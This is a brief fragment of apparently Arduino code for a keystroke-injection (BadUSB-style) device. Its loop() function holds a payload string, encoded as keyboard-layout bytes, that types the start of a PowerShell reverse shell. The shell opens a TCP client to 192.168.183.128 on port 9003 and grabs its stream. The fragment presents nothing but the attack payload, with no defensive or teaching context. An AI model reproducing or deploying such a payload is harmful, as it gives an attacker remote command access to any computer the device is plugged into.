...
void loop() {
  ...
  static char payload[] = "]client = Nez6Object Syste;\x85,Net\x85,Sockets\x85,TCPClient53\xFF 192\x85,168\x85,183\x85,128\xFF\x33\x85,Tri;5-m\xFF 9003\xFF-,]streq; = ]client\x85,GetStreq;5-, ";
